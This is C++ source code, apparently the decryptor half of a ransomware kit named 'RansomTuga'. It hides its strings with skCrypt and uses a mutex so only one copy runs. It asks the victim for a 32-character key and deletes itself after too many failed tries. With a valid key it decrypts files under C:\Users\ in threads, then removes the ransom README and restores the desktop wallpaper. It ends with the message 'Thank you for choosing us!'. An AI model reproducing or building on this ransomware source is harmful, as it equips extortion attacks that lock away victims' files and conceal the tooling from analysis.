#include "headers.h"

using namespace std;

string logo = (std::string)skCrypt(
    "  /$$$$$$$$                            /$$$$$$$                                                      /$$\n"
    " |__  $$__/                           | $$__  $$                                                    | $$\n"
    "    | $$ /$$   /$$  /$$$$$$   /$$$$$$ | $$  \\ $$  /$$$$$$   /$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$    /$$$$$$   /$$$$$$\n"
    "    | $$| $$  | $$ /$$__  $$ |____  $$| $$  | $$ /$$__  $$ /$$_____/ /$$__  $$| $$  | $$ /$$__  $$|_  $$_/   /$$__  $$ /$$__  $$\n"
    "    | $$| $$  | $$| $$  \\ $$  /$$$$$$$| $$  | $$| $$$$$$$$| $$      | $$  \\__/| $$  | $$| $$  \\ $$  | $$    | $$  \\ $$| $$  \\__/\n"
    "    | $$| $$  | $$| $$  | $$ /$$__  $$| $$  | $$| $$_____/| $$      | $$      | $$  | $$| $$  | $$  | $$ /$$| $$  | $$| $$\n"
    "    | $$|  $$$$$$/|  $$$$$$$|  $$$$$$$| $$$$$$$/|  $$$$$$$|  $$$$$$$| $$      |  $$$$$$$| $$$$$$$/  |  $$$$/|  $$$$$$/| $$\n"
    "    |__/ \\______/  \\____  $$ \\_______/|_______/  \\_______/ \\_______/|__/       \\____  $$| $$____/    \\___/   \\______/ |__/\n"
    "                   /$$  \\ $$                                                   /$$  | $$| $$\n"
    "                  |  $$$$$$/                                                  |  $$$$$$/| $$\n"
    "                   \\______/                                                    \\______/ |__/\n"
);

int main(int argc, char* argv[])
{
    CreateMutexA(0, FALSE, skCrypt("Local\\$a9wn8CbOoxY3TLuSKWvvlw==$"));
    if (GetLastError() == ERROR_ALREADY_EXISTS)
        exit(0);

    system(skCrypt("title RansomTuga - TugaDecryptor"));
    HWND console = GetConsoleWindow();
    RECT r;
    GetWindowRect(console, &r);
    MoveWindow(console, r.left, r.top, 1068, 530, TRUE);

    int retries = 0;
    string key = (string)skCrypt("");
    while (true) {
        retries += 1;

        if (MAX_RETRIES && retries > NUMBER_RETRIES) {
            if (SELFKILL_RETRIES && !DEBUG && argc > 0)
                deleteMe((string)argv[0]);
            break;
        }
        
        cout << logo << skCrypt("\n\n\n");
        cout << skCrypt("Type decryption key: ");
        cin >> key;

        if (key.size() == 32 && checkKey(key)) {
            remove((CHECKSUM_FILE + FILE_EXTENSION).c_str());
            break;
        }
            
        system(skCrypt("cls"));
    }

    
    string dir;
    if (!DEBUG)
        dir = (string)skCrypt("C:\\Users\\");
    else {
        dir = DEBUG_FOLDER;
        if (argc < 2 && fileExists(DEBUG_FOLDER))
            dir = DEBUG_FOLDER;
        else
            dir = argv[1];
    }

    vector<vector<string>> filesSplitted = vectorSplitter(getFiles(dir), MAX_THREADS);


    // DECRYPT FILES IN THREADS
    thread threads[MAX_THREADS];
    for (int i = 0; i < filesSplitted.size(); i++)
        threads[i] = thread(decryptFiles, filesSplitted[i], key);
    for (int i = 0; i < filesSplitted.size(); i++)
        threads[i].join();



    if (DROP_README)
        remove(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt")).c_str());

    if (CHANGE_WALLPAPER) {
        restoreWallpaper();
        remove((NEWWALLPAPER).c_str());
    }

    cout << skCrypt("Thank you for choosing us!\n\n");
    system(skCrypt("pause"));

    if (!DEBUG && argc > 0)
        deleteMe((string)argv[0]);
    return 0;
}